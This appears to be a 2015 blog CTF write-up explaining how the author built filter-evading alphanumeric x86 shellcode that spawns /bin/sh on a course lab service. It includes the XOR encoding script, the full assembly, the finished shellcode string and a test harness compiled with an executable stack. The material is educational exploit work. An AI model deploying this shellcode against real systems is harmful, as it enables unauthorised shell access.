@@ -1,0 +1,478 @@
+<!doctype html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Zespre's Blog, Sometimes, we generate bugs">
+
+
+        <title>alnum Write Up // Zespre's Blog // Sometimes, we generate bugs</title>
+
+
+    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/pure/0.3.0/pure-min.css">
+    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.1.0/css/font-awesome.min.css">
+    <link rel="stylesheet" href="/theme/css/pure.css">
+    <link rel="stylesheet" href="/theme/css/pygments.css">
+
+    <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+    <script src="//cdnjs.cloudflare.com/ajax/libs/fitvids/1.0.1/jquery.fitvids.min.js"></script>
+    <script>
+        $(document).ready(function(){
+            $(".content").fitVids();
+        });
+    </script>
+</head>
+
+<body>
+<div class="pure-g-r" id="layout">
+    <div class="sidebar sidebar-article pure-u">
+        <header class="header-article">
+            <hgroup>
+                <a href="/author/zespre-schmidt.html" title="See posts by Zespre Schmidt">
+                        <img class="avatar" alt="Zespre Schmidt" src="http://www.gravatar.com/avatar/93724215aa2d5a9f23d47bda8208073b">
+                </a>
+                <h2 class="article-info">Zespre Schmidt</h2>
+                <small class="about-author">Bug generator</small>
+                <h5>Published</h5>
+                <p>Wed 21 January 2015</p>
+                <a href="/">&larr;Home</a>
+            </hgroup>
+        </header>
+    </div>
+    <div class="pure-u">
+        <div class="content">
+            <section class="post">
+                <header class="post-header">
+                    <h1>alnum Write Up</h1>
+                        <p class="post-meta">
+                            // under                                 <a class="post-category" href="/tag/secprog/">secprog</a>
+                                <a class="post-category" href="/tag/writeup/">writeup</a>
+                                <a class="post-category" href="/tag/alphanumeric/">alphanumeric</a>
+                        </p>
+                </header>
+            </section>
+            <div class="section" id="alphanumeric-shellcode-executor">
+<h2>Alphanumeric Shellcode Executor</h2>
+<p>Once connect to the service, it will prompt the following message:</p>
+<div class="highlight"><pre>$ nc secprog.cs.nctu.edu.tw 10022
+Welcome to AlphaNumeric Shellcode executor!
+You can only use 0-9 A-Z a-z.
+&quot;BINSH&quot; and &quot;binsh&quot; are filter out.
+
+Please input your shellcode:
+</pre></div>
+<p>This is a alphanumeric shellcode executor, it sucks in the input string which
+only contains alphanumerics (except the characters in &quot;BINSHbinsh&quot;). The server
+code and the code below may look alike:</p>
+<div class="highlight"><pre><span class="cp">#include stdio.h</span>
+<span class="cp">#include stdlib.h</span>
+<span class="cp">#include string.h</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
+    <span class="kt">char</span> <span class="n">shellcode</span><span class="p">[];</span>
+    <span class="kt">char</span> <span class="err">\</span><span class="o">*</span><span class="n">invalid</span> <span class="o">=</span> <span class="s">&quot;BINSHbinsh&quot;</span><span class="p">;</span>
+    <span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+
+    <span class="n">scanf</span><span class="p">(</span><span class="s">&quot;%s&quot;</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">);</span>
+
+    <span class="k">for</span><span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">strlen</span><span class="p">(</span><span class="n">shellcode</span><span class="p">);</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">if</span><span class="p">(</span><span class="n">strchr</span><span class="p">(</span><span class="n">shellcode</span><span class="p">,</span> <span class="n">invalid</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
+            <span class="n">puts</span><span class="p">(</span><span class="s">&quot;Invalid input! byebye...</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+            <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+
+    <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="p">)())</span> <span class="n">shellcode</span><span class="p">)();</span>
+
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></div>
+<p>After checking the string, the program counter will jump to the starting point
+of the shellcode, and executes it. The shellcode is in stack, so Data Execution
+Prevention (DEP) must not be enabled.</p>
+</div>
+<div class="section" id="encode-the-shellcode">
+<h2>Encode The Shellcode</h2>
+<p>I found a helpful Japanese article, which goes through all the processes of
+generating an alphanumeric shellcode. But there is one more restriction
+(excluding &quot;BINSHbinsh&quot;) in the Homework.</p>
+<p>First, the most important thing is that finding a workable shellcode that opens
+a shell. Following is a normal shellcode that executes <tt class="docutils literal">/bin/sh</tt>. It pushes
+the instructions into stack and finally jumps to <tt class="docutils literal">esp</tt> to execute the code it
+just pushed.</p>
+<div class="highlight"><pre>            <span class="err">/*</span> <span class="nf">test.s</span> <span class="err">\</span><span class="o">*/</span>
+        <span class="nf">.intel_syntax</span> <span class="nv">noprefix</span>
+        <span class="nf">.globl</span> <span class="nv">_start</span>
+<span class="nl">_start:</span>
+        <span class="nf">push</span> <span class="mh">0x80cd0b42</span>
+        <span class="nf">push</span> <span class="mh">0x8de18953</span>
+        <span class="nf">push</span> <span class="mh">0x52e3896e</span>
+        <span class="nf">push</span> <span class="mh">0x69622f68</span>
+        <span class="nf">push</span> <span class="mh">0x68732f2f</span>
+        <span class="nf">push</span> <span class="mh">0x6852d231</span>
+        <span class="nf">jmp</span> <span class="nb">esp</span>
+</pre></div>
+<p>To prove that it can actually open a shell:</p>
+<div class="highlight"><pre><span class="nv">$ </span>gcc -m32 -nostdlib test.s
+<span class="nv">$ </span>./a.out
+sh-4.3<span class="err">$</span>
+</pre></div>
+<p>But when you look into the content of the binary, you'll discover that it is
+not alphanumeric, it contains many non-printable characters. Sadly, most of the
+printable characters are not allowed in the problem, i.e. &quot;BINSHbinsh&quot;.</p>
+<div class="highlight"><pre>$ objdump -s -j .text a.out
+
+a.out:     file format elf32-i386
+
+Contents of section .text:
+ 8048098 68420bcd 80685389 e18d686e 89e35268  hB...hS...hn..Rh
+ 80480a8 682f6269 682f2f73 686831d2 5268ffe4  h/bih//shh1.Rh..
+</pre></div>
+<p>The instructions listed below are valid because their opcode are in the range
+of alphanumerics.</p>
+<div class="highlight"><pre>30      XOR r/m8 r8
+31      XOR r/m16/32 r16/32
+32      XOR r8 r/m8
+33      XOR r16/32 r/m16/32
+34      XOR AL imm8
+35      XOR eAX imm16/32
+38      CMP r/m8 r8
+39      CMP r/m16/32 r16/32
+40+r    INC r16/32    (except for eax, edx)
+48+r    DEC r16/32    (except for eax, ecx, esi)
+50+r    PUSH r16/32   (except for ebx)
+58+r    POP r16/32    (only for eax, ecx, edx)
+61      POPAD
+6a      PUSH imm8
+6b      IMUL r16/32 r/m16/32 imm8
+70-7a   JO/JNO/JB/JNB/JZ/JNZ/JNA/JA/JS/JNS/JP rel8
+</pre></div>
+<p>We cannot push 32/16-bit immediate value directly into stack, because the
+opcode of the instruction is invaild. Also, the immediate value which pushed
+into the stack is invalid, either. That kind Japanese provided a neat Python
+script that automatically generates some valid values. The result of XORed of
+the values is the original value we want to push into the stack. Then we can
+XOR these value with the register to store the value we want. This Python
+script only promises that the decomposite vaules are alphanumerics. In order to
+exclude &quot;BINSHbinsh&quot; in the shellcode, that Python script must be patched to
+meet the requirement.</p>
+<div class="highlight"><pre><span class="c">#!/usr/bin/env python</span>
+<span class="c"># decomposite.py</span>
+<span class="c">#</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">import</span> <span class="nn">struct</span>
+
+<span class="n">word</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
+
+<span class="n">alnum</span> <span class="o">=</span> <span class="nb">range</span><span class="p">(</span><span class="mh">0x30</span><span class="p">,</span> <span class="mh">0x3a</span><span class="p">)</span> <span class="o">+</span> <span class="nb">range</span><span class="p">(</span><span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x5b</span><span class="p">)</span> <span class="o">+</span> <span class="nb">range</span><span class="p">(</span><span class="mh">0x61</span><span class="p">,</span> <span class="mh">0x7b</span><span class="p">)</span>
+<span class="n">allowed</span> <span class="o">=</span> <span class="p">[</span> <span class="n">i</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">alnum</span> <span class="k">if</span> <span class="nb">chr</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="ow">not</span> <span class="ow">in</span> <span class="s">&quot;BINSHbinsh&quot;</span> <span class="p">]</span>    <span class="c"># patch</span>
+
+<span class="n">chunk</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="n">word</span><span class="p">)</span>
+<span class="n">x</span> <span class="o">=</span> <span class="s">&#39;&#39;</span>
+<span class="n">y</span> <span class="o">=</span> <span class="s">&#39;&#39;</span>
+<span class="n">z</span> <span class="o">=</span> <span class="s">&#39;&#39;</span>
+
+<span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="nb">map</span><span class="p">(</span><span class="nb">ord</span><span class="p">,</span> <span class="n">chunk</span><span class="p">):</span>
+    <span class="k">if</span> <span class="n">c</span> <span class="o">&gt;=</span> <span class="mh">0x80</span><span class="p">:</span>
+        <span class="n">z</span> <span class="o">+=</span> <span class="s">&#39;</span><span class="se">\xff</span><span class="s">&#39;</span>
+        <span class="n">c</span> <span class="o">^=</span> <span class="mh">0xff</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">z</span> <span class="o">+=</span> <span class="s">&#39;</span><span class="se">\x00</span><span class="s">&#39;</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">allowed</span><span class="p">:</span>
+        <span class="k">if</span> <span class="n">i</span><span class="o">^</span><span class="n">c</span> <span class="ow">in</span> <span class="n">allowed</span><span class="p">:</span>
+            <span class="n">x</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
+            <span class="n">y</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">i</span><span class="o">^</span><span class="n">c</span><span class="p">)</span>
+            <span class="k">break</span>
+
+<span class="k">print</span> <span class="nb">hex</span><span class="p">(</span><span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="n">x</span><span class="p">)[</span><span class="mi">0</span><span class="p">])</span>
+<span class="k">print</span> <span class="nb">hex</span><span class="p">(</span><span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="n">y</span><span class="p">)[</span><span class="mi">0</span><span class="p">])</span>
+<span class="k">print</span> <span class="nb">hex</span><span class="p">(</span><span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="n">z</span><span class="p">)[</span><span class="mi">0</span><span class="p">])</span>
+</pre></div>
+<p>With this handy script, we can get rid of many invalid characters.</p>
+<div class="highlight"><pre>[origin]: 0x80cd0b42
+0x30433230
+0x4f713972
+0xffff0000
+[origin]: 0x8de18953
+0x31443030
+0x435a4663
+0xffffff00
+[origin]: 0x52e3896e
+0x31443034
+0x6358465a
+0xffff00
+[origin]: 0x69622f68
+0x30304330
+0x59526c58
+0x0
+[origin]: 0x68732f2f
+0x30304343
+0x58436c6c
+0x0
+[origin]: 0x6852d231
+0x30314141
+0x58636c70
+0xff00
+</pre></div>
+</div>
+<div class="section" id="strategy">
+<h2>Strategy</h2>
+<p>So the strategy of generating an alphanumeric shellcode is:</p>
+<ol class="arabic simple">
+<li>Clear all registers</li>
+<li>Make some register to be <tt class="docutils literal">0xffffffff</tt> for convenience</li>
+<li><tt class="docutils literal">XOR</tt> register with immediate values to shape the wanted value</li>
+<li><tt class="docutils literal">PUSH</tt> the register into the stack</li>
+<li>Do some minor change through XORing byte by byte</li>
+<li><tt class="docutils literal">PUSH esp</tt> into the stack</li>
+<li>Jump to the top of the stack by calling <tt class="docutils literal">RET</tt></li>
+</ol>
+<p>You might wonder: why <tt class="docutils literal">RET</tt> can be used? Actually it can't. So we place a
+dummy value there, and patch it when executing the shellcode. The total length
+of the shellcode should be carefully calculated in order to patch the right
+byte where the dummy value resides. Otherwise, our happy friend (core dump)
+will show up.</p>
+</div>
+<div class="section" id="patch-patch-patch">
+<h2>Patch Patch Patch</h2>
+<p>The almighty Japanese had already provided a prototype for us! Thanks bro! But
+still there are some parts must be patched to pass the check. All I have done
+is that:</p>
+<ul class="simple">
+<li>Replace the invalid immediate vaule</li>
+<li>Replace <tt class="docutils literal">esi</tt> with <tt class="docutils literal">edi</tt> in <tt class="docutils literal">patch_ret</tt></li>
+<li>Replace <tt class="docutils literal">ebx</tt> and <tt class="docutils literal">edx</tt> with <tt class="docutils literal">esi</tt> when pushing zero into the stack</li>
+<li>Eliminate 5 lines of <tt class="docutils literal">dec ecx</tt>, and increase the length of the shellcode</li>
+<li>Re-calculate the position of the dummy value.</li>
+</ul>
+<p>And the result is:</p>
+<div class="highlight"><pre>        <span class="err">/*</span> <span class="nf">alnum.s</span> <span class="err">\</span><span class="o">*/</span>
+        <span class="nf">.intel_syntax</span> <span class="nv">noprefix</span>
+        <span class="nf">.globl</span> <span class="nv">_start</span>
+<span class="nl">_start:</span>
+        <span class="err">/*</span> <span class="nf">set</span> <span class="nv">buffer</span> <span class="nv">register</span> <span class="nv">to</span> <span class="nb">ecx</span> <span class="err">\</span><span class="o">*/</span>
+        <span class="nf">push</span> <span class="nb">eax</span>
+        <span class="nf">pop</span> <span class="nb">ecx</span>
+
+<span class="nl">prepare_registers:</span>
+        <span class="nf">push</span> <span class="mh">0x30</span>
+        <span class="nf">pop</span> <span class="nb">eax</span>
+        <span class="nf">xor</span> <span class="nb">al</span><span class="p">,</span> <span class="mh">0x30</span>
+                  <span class="err">/*</span> <span class="nf">omit</span> <span class="nb">eax</span><span class="p">,</span> <span class="nb">ecx</span> <span class="err">\</span><span class="o">*/</span>
+        <span class="nf">push</span> <span class="nb">eax</span>  <span class="o">/*</span> <span class="nb">edx</span> <span class="err">=</span> <span class="mi">0</span> <span class="err">\</span><span class="o">*/</span>
+        <span class="nf">push</span> <span class="nb">eax</span>  <span class="o">/*</span> <span class="nb">ebx</span> <span class="err">=</span> <span class="mi">0</span> <span class="err">\</span><span class="o">*/</span>
+        <span class="nf">push</span> <span class="nb">eax</span>
+        <span class="nf">push</span> <span class="nb">eax</span>
+        <span class="nf">push</span> <span class="nb">eax</span>  <span class="o">/*</span> <span class="nb">esi</span> <span class="err">=</span> <span class="mi">0</span> <span class="err">\</span><span class="o">*/</span>
+        <span class="nf">push</span> <span class="nb">ecx</span>  <span class="o">/*</span> <span class="nb">edi</span> <span class="err">=</span> <span class="nv">buffer</span> <span class="err">\</span><span class="o">*/</span>
+        <span class="nf">popad</span>
+        <span class="nf">dec</span> <span class="nb">edx</span>   <span class="o">/*</span> <span class="nb">edx</span> <span class="err">=</span> <span class="mh">0xffffffff</span> <span class="err">\</span><span class="o">*/</span>
+
+<span class="nl">patch_ret:</span>
+        <span class="err">/*</span> <span class="nf">garbage</span> <span class="err">\</span><span class="o">*/</span>
+        <span class="nf">push</span> <span class="nb">eax</span>
+        <span class="nf">xor</span> <span class="nb">eax</span><span class="p">,</span> <span class="mh">0x30303030</span>
+
+        <span class="err">/*</span> <span class="err">0</span><span class="nf">x44</span> <span class="o">^</span> <span class="mh">0x78</span> <span class="o">^</span> <span class="mh">0xff</span> <span class="err">==</span> <span class="mh">0xc3</span> <span class="p">(</span><span class="nv">ret</span><span class="p">)</span> <span class="err">\</span><span class="o">*/</span>
+        <span class="nf">push</span> <span class="nb">edx</span>
+        <span class="nf">pop</span> <span class="nb">eax</span>
+        <span class="nf">xor</span> <span class="nb">al</span><span class="p">,</span> <span class="mh">0x44</span>
+        <span class="nf">push</span> <span class="mh">0x30</span>
+        <span class="nf">pop</span> <span class="nb">ecx</span>
+        <span class="nf">xor</span> <span class="p">[</span><span class="nb">edi</span><span class="o">+</span><span class="mi">2</span><span class="o">*</span><span class="nb">ecx</span><span class="o">+</span><span class="mh">0x30</span><span class="p">],</span> <span class="nb">al</span>
+
+<span class="nl">build_stack:</span>
+        <span class="err">/*</span> <span class="nf">push</span> <span class="mh">0x80cd0b42</span> <span class="err">\</span><span class="o">*/</span>
+        <span class="nf">push</span> <span class="nb">esi</span>
+        <span class="nf">pop</span> <span class="nb">eax</span>
+        <span class="nf">xor</span> <span class="nb">eax</span><span class="p">,</span> <span class="mh">0x30433230</span>
+        <span class="nf">xor</span> <span class="nb">eax</span><span class="p">,</span> <span class="mh">0x4f713972</span>
+        <span class="nf">push</span> <span class="nb">eax</span>
+        <span class="nf">push</span> <span class="nb">esp</span>
+        <span class="nf">pop</span> <span class="nb">ecx</span>
+        <span class="nf">inc</span> <span class="nb">ecx</span>
+        <span class="nf">inc</span> <span class="nb">ecx</span>
+        <span class="nf">xor</span> <span class="p">[</span><span class="nb">ecx</span><span class="p">],</span> <span class="nb">dh</span>
+        <span class="nf">inc</span> <span class="nb">ecx</span>
+        <span class="nf">xor</span> <span class="p">[</span><span class="nb">ecx</span><span class="p">],</span> <span class="nb">dh</span>
+
+        <span class="err">/*</span> <span class="nf">push</span> <span class="mh">0x8de18953</span> <span class="err">\</span><span class="o">*/</span>
+        <span class="nf">push</span> <span class="nb">esi</span>
+        <span class="nf">pop</span> <span class="nb">eax</span>
+        <span class="nf">xor</span> <span class="nb">eax</span><span class="p">,</span> <span class="mh">0x31443030</span>
+        <span class="nf">xor</span> <span class="nb">eax</span><span class="p">,</span> <span class="mh">0x435a4663</span>
+        <span class="nf">push</span> <span class="nb">eax</span>
+        <span class="nf">push</span> <span class="nb">esp</span>
+        <span class="nf">pop</span> <span class="nb">ecx</span>
+        <span class="nf">inc</span> <span class="nb">ecx</span>
+        <span class="nf">xor</span> <span class="p">[</span><span class="nb">ecx</span><span class="p">],</span> <span class="nb">dh</span>
+        <span class="nf">inc</span> <span class="nb">ecx</span>
+        <span class="nf">xor</span> <span class="p">[</span><span class="nb">ecx</span><span class="p">],</span> <span class="nb">dh</span>
+        <span class="nf">inc</span> <span class="nb">ecx</span>
+        <span class="nf">xor</span> <span class="p">[</span><span class="nb">ecx</span><span class="p">],</span> <span class="nb">dh</span>
+
+        <span class="err">/*</span> <span class="nf">push</span> <span class="mh">0x52e3896e</span> <span class="err">\</span><span class="o">*/</span>
+        <span class="nf">push</span> <span class="nb">esi</span>
+        <span class="nf">pop</span> <span class="nb">eax</span>
+        <span class="nf">xor</span> <span class="nb">eax</span><span class="p">,</span> <span class="mh">0x31443034</span>
+        <span class="nf">xor</span> <span class="nb">eax</span><span class="p">,</span> <span class="mh">0x6358465a</span>
+        <span class="nf">push</span> <span class="nb">eax</span>
+        <span class="nf">push</span> <span class="nb">esp</span>
+        <span class="nf">pop</span> <span class="nb">ecx</span>
+        <span class="nf">inc</span> <span class="nb">ecx</span>
+        <span class="nf">xor</span> <span class="p">[</span><span class="nb">ecx</span><span class="p">],</span> <span class="nb">dh</span>
+        <span class="nf">inc</span> <span class="nb">ecx</span>
+        <span class="nf">xor</span> <span class="p">[</span><span class="nb">ecx</span><span class="p">],</span> <span class="nb">dh</span>
+
+        <span class="err">/*</span> <span class="nf">push</span> <span class="mh">0x69622f68</span> <span class="err">\</span><span class="o">*/</span>
+        <span class="nf">push</span> <span class="nb">esi</span>
+        <span class="nf">pop</span> <span class="nb">eax</span>
+        <span class="nf">xor</span> <span class="nb">eax</span><span class="p">,</span> <span class="mh">0x30304330</span>
+        <span class="nf">xor</span> <span class="nb">eax</span><span class="p">,</span> <span class="mh">0x59526c58</span>
+        <span class="nf">push</span> <span class="nb">eax</span>
+
+        <span class="err">/*</span> <span class="nf">push</span> <span class="mh">0x68732f2f</span> <span class="err">\</span><span class="o">*/</span>
+        <span class="nf">push</span> <span class="nb">esi</span>
+        <span class="nf">pop</span> <span class="nb">eax</span>
+        <span class="nf">xor</span> <span class="nb">eax</span><span class="p">,</span> <span class="mh">0x30304343</span>
+        <span class="nf">xor</span> <span class="nb">eax</span><span class="p">,</span> <span class="mh">0x58436c6c</span>
+        <span class="nf">push</span> <span class="nb">eax</span>
+
+        <span class="err">/*</span> <span class="nf">push</span> <span class="mh">0x6852d231</span> <span class="err">\</span><span class="o">*/</span>
+        <span class="nf">push</span> <span class="nb">esi</span>
+        <span class="nf">pop</span> <span class="nb">eax</span>
+        <span class="nf">xor</span> <span class="nb">eax</span><span class="p">,</span> <span class="mh">0x30314141</span>
+        <span class="nf">xor</span> <span class="nb">eax</span><span class="p">,</span> <span class="mh">0x58636c70</span>
+        <span class="nf">push</span> <span class="nb">eax</span>
+        <span class="nf">push</span> <span class="nb">esp</span>
+        <span class="nf">pop</span> <span class="nb">ecx</span>
+        <span class="nf">inc</span> <span class="nb">ecx</span>
+        <span class="nf">xor</span> <span class="p">[</span><span class="nb">ecx</span><span class="p">],</span> <span class="nb">dh</span>
+
+        <span class="nf">push</span> <span class="nb">esp</span>
+
+<span class="nl">ret:</span>
+        <span class="nf">.byte</span> <span class="mh">0x78</span>
+</pre></div>
+<p>It is time to assemble the assembly code into the real executable! After that
+we can check whether the <tt class="docutils literal">.text</tt> section consists of all printable character
+or not.</p>
+<div class="highlight"><pre><span class="nv">$ </span>gcc -m32 -nostdlib alnum.s -o alnum
+<span class="nv">$ </span>objdump -s -j .text alnum
+
+alnum:     file format elf32-i386
+
+Contents of section .text:
+8048098 50596a30 58343050 50505050 51614a50  PYj0X40PPPPPQaJP
+80480a8 58505850 58353030 30303530 30303035  XPXPX50000500005
+80480b8 30303030 35303030 30525834 446a3059  000050000RX4Dj0Y
+80480c8 30444f44 56583530 32433035 7239714f  0DODVX502C05r9qO
+80480d8 50545941 41303141 30315658 35303044  PTYAA01A01VX500D
+80480e8 31356346 5a435054 59413031 41303141  15cFZCPTYA01A01A
+80480f8 30315658 35343044 31355a46 58635054  01VX540D15ZFXcPT
+8048108 59413031 41303156 58353043 30303558  YA01A01VX50C005X
+8048118 6c525950 56583543 43303035 6c6c4358  lRYPVX5CC005llCX
+8048128 50565835 41413130 35706c63 58505459  PVX5AA105plcXPTY
+8048138 41303154 78                          A01Tx
+</pre></div>
+<p>Using the following command to check whether the alpanumeric shellcode contains
+&quot;BINSHbinsh&quot; or not.</p>
+<div class="highlight"><pre><span class="nv">$ </span><span class="nb">echo</span> <span class="s1">&#39;PYj0X40PPPPPQaJP50000RX4Dj0Y0DO0VX502C05r9qOPTYAA01A01VX500D15cFZCPTYA01A01A01VX540D15ZFXcPTYA01A01VX50C005XlRYPVX5CC005llCXPVX5AA105plcXPTYA01Tx&#39;</span> | grep <span class="o">[</span>BINSHbinsh<span class="o">]</span>
+</pre></div>
+<p>Nothing showed up! That means there is no character of &quot;BINSHbinsh&quot;.  And the
+alphanumeric shellcode is only 151 characters long. So let's put the shellcode
+into our simple shellcode executor:</p>
+<div class="highlight"><pre><span class="cm">/* shellcode.c \*/</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="kt">char</span> <span class="n">shellcode</span><span class="p">[]</span> <span class="o">=</span> <span class="s">&quot;PYj0X40PPPPPQaJPXPXPX50000500005000050000RX4Dj0Y0DODVX502C05r9qOPTYAA01A01VX500D15cFZCPTYA01A01A01VX540D15ZFXcPTYA01A01VX50C005XlRYPVX5CC005llCXPVX5AA105plcXPTYA01Tx&quot;</span><span class="p">;</span>
+
+    <span class="p">(</span><span class="err">\</span><span class="o">*</span><span class="p">(</span><span class="kt">void</span> <span class="p">(</span><span class="err">\</span><span class="o">*</span><span class="p">)())</span><span class="n">shellcode</span><span class="p">)();</span>
+<span class="p">}</span>
+</pre></div>
+<p>Do not forget we are on 32-bit machine and the shellcode is stored in the
+stack. To be able to execute the shellcode on the stack, one must disable DEP
+during the compilation time.</p>
+<div class="highlight"><pre><span class="nv">$ </span>gcc -m32 -z execstack -o shellcode shellcode.c
+<span class="nv">$ </span>./shellcode
+sh-4.3<span class="err">$</span>
+</pre></div>
+<p>Bingo! Now submit the alphanumeric shellcode to the server, and cat the flag!</p>
+</div>
+<div class="section" id="flag">
+<h2>Flag</h2>
+<div class="highlight"><pre>SECPROG{IncredibleASMProgrammer}
+</pre></div>
+</div>
+<div class="section" id="references">
+<h2>References</h2>
+<ul class="simple">
+<li><a class="reference external" href="http://inaz2.hatenablog.com/entry/2014/07/11/004655">x86 alphanumeric shellcodeを書いてみる</a></li>
+<li><a class="reference external" href="http://inaz2.hatenablog.com/entry/2014/07/13/025626">x86 alphanumeric shellcode encoderを書いてみる</a></li>
+<li><a class="reference external" href="http://skypher.com/wiki/index.php?title=X86_alphanumeric_opcodes">Hacking/Shellcode/Alphanumeric/x86 printable opcodes</a></li>
+<li><a class="reference external" href="http://www.c-jump.com/CIS77/CPU/x86/lecture.html#X77_0100_sib_byte_layout">Encoding Real x86 Instructions</a></li>
+</ul>
+</div>
+
+            <div class="hr"></div>
+            <a href="#" class="go-top">Go Top</a>
+<div class="comments">
+    <div id="disqus_thread"></div>
+    <script type="text/javascript">
+        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
+        var disqus_shortname = "zespre"; // required: replace example with your forum shortname
+
+        /* * * DON'T EDIT BELOW THIS LINE * * */
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div><footer class="footer">
+    <p>&copy; Zespre's Blog &ndash;
+        Built with <a href="https://github.com/PurePelicanTheme/pure">Pure Theme</a>
+        for <a href="http://blog.getpelican.com/">Pelican</a>
+    </p>
+</footer>        </div>
+    </div>
+</div>
+    <script>
+        var $top = $('.go-top');
+
+        // Show or hide the sticky footer button
+        $(window).scroll(function() {
+            if ($(this).scrollTop() > 200) {
+                $top.fadeIn(200);
+            } else {
+                $top.fadeOut(200);
+            }
+        });
+
+        // Animate the scroll to top
+        $top.click(function(event) {
+            event.preventDefault();
+            $('html, body').animate({scrollTop: 0}, 300);
+        })
+
+        // Makes sure that the href="#" attached to the <a> elements
+        // don't scroll you back up the page.
+        $('body').on('click', 'a[href="#"]', function(event) {
+            event.preventDefault();
+        });
+    </script>
+    <script type="text/javascript">
+        var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
+        document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
+    </script>
+    <script type="text/javascript">
+        try {
+            var pageTracker = _gat._getTracker("UA-56544554-1");
+            pageTracker._trackPageview();
+            } catch(err) {}
+    </script>
+</body>
+</html>
